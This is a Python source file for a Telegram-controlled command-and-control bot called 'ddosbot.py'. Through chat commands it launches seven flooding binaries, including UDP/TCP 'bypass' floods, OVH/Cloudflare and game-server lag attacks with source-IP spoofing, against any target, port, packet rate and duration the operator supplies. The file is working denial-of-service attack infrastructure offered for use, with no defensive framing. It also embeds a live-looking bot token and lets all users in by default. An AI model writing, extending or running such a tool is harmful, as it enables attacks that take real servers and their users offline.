#!/usr/bin/env python3
# ddosbot.py — 7-tool C2 edition, clean output
# pip install python-telegram-bot --upgrade httpx

import os
import shlex
import asyncio
import socket
from pathlib import Path
from datetime import datetime
import httpx
from telegram import Update, InputMediaPhoto
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.request import HTTPXRequest

# ═══════════════════════════════════════════════════
LOCAL_BIND_IP = "172.16.216.100"

BASE_DIR = Path.home() / "Desktop" / "C2DDoS"
LOG_FILE = BASE_DIR / "bot_launch.log"
IMAGE_PATH = BASE_DIR / "c2.png"

BOT_TOKEN = "8979019358:AAGZffQ7Yjl8RRarjJaR8wbCgrHeh343y_M"
AUTHORIZED_USERS = set()

UDP_BYPASS_BIN = BASE_DIR / "UDP-BYPASS"
TCP_BYPASS_BIN = BASE_DIR / "TCP-BYPASS"
FIVEM_BIN = BASE_DIR / "FIVEM-BypassV2"
UDP_STORM_BIN = BASE_DIR / "UDP-STORM"
OVH_NFO_BIN = BASE_DIR / "OVH-NFO-CLOUDFLARE"
TCP_RAPE_BIN = BASE_DIR / "TCP-RAPE"
GARRYSMOD_BIN = BASE_DIR / "GARRYSMOD-LAG"

FIVEM_PROTOCOLS = {"cs16", "fivem", "fivem2", "gmod", "csgo", "ts3", "amongus", "source"}


def log(msg: str) -> None:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{ts}] {msg}\n")


def authed(uid: int) -> bool:
    return uid in AUTHORIZED_USERS if AUTHORIZED_USERS else True


def v_target(t: str) -> bool:
    return bool(t) and len(t) <= 253 and all(
        c in "0123456789.:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-/" for c in t
    )


def v_port(p: str) -> bool:
    try:
        return 0 <= int(p) <= 65535
    except ValueError:
        return False


def v_pos(val: str, mx: int = 100_000_000) -> bool:
    try:
        return -1 <= int(val) <= mx
    except ValueError:
        return False


def v_ip_or_zero(t: str) -> bool:
    if t == "0":
        return True
    try:
        parts = t.split("/")
        ip = parts[0]
        return 0 < int(parts[1]) <= 32 if len(parts) == 2 else bool(socket.inet_aton(ip))
    except (ValueError, OSError):
        return False


async def send_launch_photo(update: Update, caption: str) -> None:
    if IMAGE_PATH.exists():
        with open(IMAGE_PATH, "rb") as photo:
            await update.message.reply_photo(
                photo=photo,
                caption=caption,
                parse_mode="Markdown"
            )
    else:
        await update.message.reply_text(caption, parse_mode="Markdown")


async def run_binary(update: Update, cmd_list: list, timeout: int, tool_name: str) -> None:
    # We don't use shlex on the full cmd_list for display anymore.
    # We build a clean display string using only the tool name and args.
    display_cmd = f"{tool_name} " + " ".join(shlex.quote(p) for p in cmd_list[2:])
    log(f"FIRE → {display_cmd}")

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd_list,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout + 15)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            await update.message.reply_text("⚠️ Timed out, killed.")
            log(f"TIMEOUT: {display_cmd}")
            return

        out = (stdout.decode(errors="replace").strip() if stdout else "")[:3000]
        err = (stderr.decode(errors="replace").strip() if stderr else "")[:1000]

        resp = [f"✅ Done (exit {proc.returncode})", f"Cmd: `{display_cmd}`"]
        if out:
            resp.append(f"```\n{out}\n```")
        if err:
            resp.append(f"stderr:\n```\n{err}\n```")

        await update.message.reply_text("\n".join(resp), parse_mode="Markdown")
        log(f"DONE exit={proc.returncode}")
    except Exception as e:
        await update.message.reply_text(f"🔥 Error: `{e}`", parse_mode="Markdown")
        log(f"ERROR: {e}")


# ─── Tool 1: UDP-BYPASS ─────────────────────────────────
async def fire_udp_bypass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not authed(update.effective_user.id): return await update.message.reply_text("⛔ Unauthorized.")
    if len(context.args) != 5:
        return await update.message.reply_text("Usage: `/udp <target> <port> <threads> <pps> <time>`", parse_mode="Markdown")
    
    target, port, threads, pps, dur = context.args
    for ok, msg in [
        (v_target(target), f"❌ Bad target: `{target}`"),
        (v_port(port), f"❌ Bad port: `{port}`"),
        (v_pos(threads, 10000), f"❌ Bad threads: `{threads}`"),
        (v_pos(pps), f"❌ Bad pps: `{pps}`"),
        (v_pos(dur, 86400), f"❌ Bad time: `{dur}`"),
    ]:
        if not ok: return await update.message.reply_text(msg, parse_mode="Markdown")

    if not UDP_BYPASS_BIN.exists(): return await update.message.reply_text(f"❌ Missing: `UDP-BYPASS`", parse_mode="Markdown")

    cmd = ["sudo", str(UDP_BYPASS_BIN), target, port, threads, pps, dur]
    display = f"UDP-BYPASS {target} {port} {threads} {pps} {dur}"
    await send_launch_photo(update, f"🚀 Launching...\n`{display}`")
    await run_binary(update, cmd, int(dur), "UDP-BYPASS")


# ─── Tool 2: TCP-BYPASS ─────────────────────────────────
async def fire_tcp_bypass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not authed(update.effective_user.id): return await update.message.reply_text("⛔ Unauthorized.")
    if len(context.args) != 5:
        return await update.message.reply_text("Usage: `/tcp <target> <port> <threads> <pps> <time>`", parse_mode="Markdown")
    
    target, port, threads, pps, dur = context.args
    for ok, msg in [
        (v_target(target), f"❌ Bad target: `{target}`"),
        (v_port(port), f"❌ Bad port: `{port}`"),
        (v_pos(threads, 10000), f"❌ Bad threads: `{threads}`"),
        (v_pos(pps), f"❌ Bad pps: `{pps}`"),
        (v_pos(dur, 86400), f"❌ Bad time: `{dur}`"),
    ]:
        if not ok: return await update.message.reply_text(msg, parse_mode="Markdown")

    if not TCP_BYPASS_BIN.exists(): return await update.message.reply_text(f"❌ Missing: `TCP-BYPASS`", parse_mode="Markdown")

    cmd = ["sudo", str(TCP_BYPASS_BIN), target, port, threads, pps, dur]
    display = f"TCP-BYPASS {target} {port} {threads} {pps} {dur}"
    await send_launch_photo(update, f"🚀 Launching...\n`{display}`")
    await run_binary(update, cmd, int(dur), "TCP-BYPASS")


# ─── Tool 3: FIVEM-BypassV2 ─────────────────────────────
async def fire_fivem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not authed(update.effective_user.id): return await update.message.reply_text("⛔ Unauthorized.")
    if len(context.args) != 8:
        return await update.message.reply_text(
            "Usage: `/fivem <target> <dst_port> <src_port> <spoof_ip/0> <threads> <pps/-1> <time> <protocol>`\n"
            "Protocols: cs16, fivem, fivem2, gmod, csgo, ts3, amongus, source", parse_mode="Markdown")
    
    target, dst, src, spoof, threads, pps, dur, proto = context.args
    for ok, msg in [
        (v_target(target), f"❌ Bad target: `{target}`"),
        (v_port(dst), f"❌ Bad dst port: `{dst}`"),
        (v_port(src), f"❌ Bad src port: `{src}`"),
        (v_ip_or_zero(spoof), f"❌ Bad spoof IP: `{spoof}`"),
        (v_pos(threads, 10000), f"❌ Bad threads: `{threads}`"),
        (v_pos(pps), f"❌ Bad pps: `{pps}`"),
        (v_pos(dur, 86400), f"❌ Bad time: `{dur}`"),
        (proto in FIVEM_PROTOCOLS, f"❌ Bad protocol: `{proto}`\nValid: {', '.join(sorted(FIVEM_PROTOCOLS))}"),
    ]:
        if not ok: return await update.message.reply_text(msg, parse_mode="Markdown")

    if not FIVEM_BIN.exists(): return await update.message.reply_text(f"❌ Missing: `FIVEM-BypassV2`", parse_mode="Markdown")

    cmd = ["sudo", str(FIVEM_BIN), target, dst, src, spoof, threads, pps, dur, proto]
    display = f"FIVEM-BypassV2 {target} {dst} {src} {spoof} {threads} {pps} {dur} {proto}"
    await send_launch_photo(update, f"🚀 Launching...\n`{display}`")
    await run_binary(update, cmd, int(dur), "FIVEM-BypassV2")


# ─── Tool 4: UDP-STORM ──────────────────────────────────
async def fire_udp_storm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not authed(update.effective_user.id): return await update.message.reply_text("⛔ Unauthorized.")
    if len(context.args) != 4:
        return await update.message.reply_text("Usage: `/storm <IP> <Threads> <PPS> <Time>`", parse_mode="Markdown")
    
    target, threads, pps, dur = context.args
    for ok, msg in [
        (v_target(target), f"❌ Bad target: `{target}`"),
        (v_pos(threads, 10000), f"❌ Bad threads: `{threads}`"),
        (v_pos(pps), f"❌ Bad pps: `{pps}`"),
        (v_pos(dur, 86400), f"❌ Bad time: `{dur}`"),
    ]:
        if not ok: return await update.message.reply_text(msg, parse_mode="Markdown")

    if not UDP_STORM_BIN.exists(): return await update.message.reply_text(f"❌ Missing: `UDP-STORM`", parse_mode="Markdown")

    cmd = ["sudo", str(UDP_STORM_BIN), target, threads, pps, dur]
    display = f"UDP-STORM {target} {threads} {pps} {dur}"
    await send_launch_photo(update, f"🚀 Launching...\n`{display}`")
    await run_binary(update, cmd, int(dur), "UDP-STORM")


# ─── Tool 5: OVH-NFO-CLOUDFLARE ─────────────────────────
async def fire_ovh_nfo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not authed(update.effective_user.id): return await update.message.reply_text("⛔ Unauthorized.")
    if len(context.args) != 4:
        return await update.message.reply_text("Usage: `/ovh <IP> <threads> <-1> <time>`", parse_mode="Markdown")
    
    target, threads, throttle, dur = context.args
    for ok, msg in [
        (v_target(target), f"❌ Bad target: `{target}`"),
        (v_pos(threads, 10000), f"❌ Bad threads: `{threads}`"),
        (v_pos(throttle), f"❌ Bad throttle: `{throttle}`"),
        (v_pos(dur, 86400), f"❌ Bad time: `{dur}`"),
    ]:
        if not ok: return await update.message.reply_text(msg, parse_mode="Markdown")

    if not OVH_NFO_BIN.exists(): return await update.message.reply_text(f"❌ Missing: `OVH-NFO-CLOUDFLARE`", parse_mode="Markdown")

    cmd = ["sudo", str(OVH_NFO_BIN), target, threads, throttle, dur]
    display = f"OVH-NFO-CLOUDFLARE {target} {threads} {throttle} {dur}"
    await send_launch_photo(update, f"🚀 Launching...\n`{display}`")
    await run_binary(update, cmd, int(dur), "OVH-NFO-CLOUDFLARE")


# ─── Tool 6: TCP-RAPE ──────────────────────────────────
async def fire_tcp_rape(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not authed(update.effective_user.id): return await update.message.reply_text("⛔ Unauthorized.")
    if len(context.args) != 5:
        return await update.message.reply_text("Usage: `/rape <target IP> <port> <threads> <throttle/-1> <time>`", parse_mode="Markdown")
    
    target, port, threads, throttle, dur = context.args
    for ok, msg in [
        (v_target(target), f"❌ Bad target: `{target}`"),
        (v_port(port), f"❌ Bad port: `{port}`"),
        (v_pos(threads, 10000), f"❌ Bad threads: `{threads}`"),
        (v_pos(throttle), f"❌ Bad throttle: `{throttle}`"),
        (v_pos(dur, 86400), f"❌ Bad time: `{dur}`"),
    ]:
        if not ok: return await update.message.reply_text(msg, parse_mode="Markdown")

    if not TCP_RAPE_BIN.exists(): return await update.message.reply_text(f"❌ Missing: `TCP-RAPE`", parse_mode="Markdown")

    cmd = ["sudo", str(TCP_RAPE_BIN), target, port, threads, throttle, dur]
    display = f"TCP-RAPE {target} {port} {threads} {throttle} {dur}"
    await send_launch_photo(update, f"🚀 Launching...\n`{display}`")
    await run_binary(update, cmd, int(dur), "TCP-RAPE")


# ─── Tool 7: GARRYSMOD-LAG ──────────────────────────────
async def fire_gmod_lag(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not authed(update.effective_user.id): return await update.message.reply_text("⛔ Unauthorized.")
    if len(context.args) != 8:
        return await update.message.reply_text(
            "Usage: `/gmod <Target IP/24/MIN/MAX CLASS> <DST PORT/0> <SRC PORT/0> <127.0.0.1/32 or 0> <THREAD> <PPS/-1> <TIME> <protocol>`\n"
            "Protocols: cs16, fivem, fivem2, gmod, csgo, ts3, amongus, source", parse_mode="Markdown")
    
    target, dst, src, spoof, threads, pps, dur, proto = context.args
    for ok, msg in [
        (v_target(target), f"❌ Bad target: `{target}`"),
        (v_port(dst), f"❌ Bad dst port: `{dst}`"),
        (v_port(src), f"❌ Bad src port: `{src}`"),
        (v_ip_or_zero(spoof), f"❌ Bad spoof IP: `{spoof}`"),
        (v_pos(threads, 10000), f"❌ Bad threads: `{threads}`"),
        (v_pos(pps), f"❌ Bad pps: `{pps}`"),
        (v_pos(dur, 86400), f"❌ Bad time: `{dur}`"),
        (proto in FIVEM_PROTOCOLS, f"❌ Bad protocol: `{proto}`\nValid: {', '.join(sorted(FIVEM_PROTOCOLS))}"),
    ]:
        if not ok: return await update.message.reply_text(msg, parse_mode="Markdown")

    if not GARRYSMOD_BIN.exists(): return await update.message.reply_text(f"❌ Missing: `GARRYSMOD-LAG`", parse_mode="Markdown")

    cmd = [str(GARRYSMOD_BIN), target, dst, src, spoof, threads, pps, dur, proto]
    display = f"GARRYSMOD-LAG {target} {dst} {src} {spoof} {threads} {pps} {dur} {proto}"
    await send_launch_photo(update, f"🚀 Launching...\n`{display}`")
    await run_binary(update, cmd, int(dur), "GARRYSMOD-LAG")


# ─── Status & Help ─────────────────────────────────────
async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not authed(update.effective_user.id): return await update.message.reply_text("⛔ Unauthorized.")

    lines = ["🔍 **Status**"]
    tools = [
        ("UDP-BYPASS", UDP_BYPASS_BIN), ("TCP-BYPASS", TCP_BYPASS_BIN), 
        ("FIVEM-BypassV2", FIVEM_BIN), ("UDP-STORM", UDP_STORM_BIN),
        ("OVH-NFO-CLOUDFLARE", OVH_NFO_BIN), ("TCP-RAPE", TCP_RAPE_BIN), 
        ("GARRYSMOD-LAG", GARRYSMOD_BIN)
    ]
    for name, path in tools:
        exists = path.exists()
        exec_ok = os.access(path, os.X_OK) if exists else False
        size = path.stat().st_size if exists else 0
        lines.append(f"**{name}**\n  Exists: {'✅' if exists else '❌'} | Exec: {'✅' if exec_ok else '❌'} | {size}B")

    img_status = "✅ Found" if IMAGE_PATH.exists() else "❌ Missing"
    lines.append(f"**c2.png**\n  Exists: {img_status}")

    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "**L4 C2 Bot — 7 Tools**\n\n"
        "`/udp <target> <port> <threads> <pps> <time>`\n"
        "`/tcp <target> <port> <threads> <pps> <time>`\n"
        "`/fivem <target> <dst> <src> <spoof/0> <threads> <pps/-1> <time> <protocol>`\n"
        "`/storm <IP> <Threads> <PPS> <Time>`\n"
        "`/ovh <IP> <threads> <-1> <time>`\n"
        "`/rape <target> <port> <threads> <throttle/-1> <time>`\n"
        "`/gmod <target> <dst> <src> <spoof/0> <threads> <pps/-1> <time> <protocol>`\n\n"
        "`/status` — check binaries & photo\n"
        "`/help` — this message\n\n"
        "Protocols: cs16, fivem, fivem2, gmod, csgo, ts3, amongus, source",
        parse_mode="Markdown"
    )


async def post_init(app: Application) -> None:
    me = await app.bot.get_me()
    print(f"✅ Connected as @{me.username}")
    log(f"STARTED as @{me.username}")


def main() -> None:
    transport = httpx.AsyncHTTPTransport(local_address=LOCAL_BIND_IP)
    custom_client = httpx.AsyncClient(transport=transport)
    request = HTTPXRequest(connect_timeout=30.0, read_timeout=45.0)
    request._client = custom_client
    
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .request(request)
        .build()
    )

    app.add_handler(CommandHandler("udp", fire_udp_bypass))
    app.add_handler(CommandHandler("tcp", fire_tcp_bypass))
    app.add_handler(CommandHandler("fivem", fire_fivem))
    app.add_handler(CommandHandler("storm", fire_udp_storm))
    app.add_handler(CommandHandler("ovh", fire_ovh_nfo))
    app.add_handler(CommandHandler("rape", fire_tcp_rape))
    app.add_handler(CommandHandler("gmod", fire_gmod_lag))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("start", help_cmd))

    print(f"🤖 Starting C2 Bot (7-tool, bound to {LOCAL_BIND_IP})...")
    print(f"  Directory: {BASE_DIR}")
    print(f"  Photo:     {IMAGE_PATH} {'✅' if IMAGE_PATH.exists() else '❌'}")
    print("  Ctrl+C to stop.\n")

    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
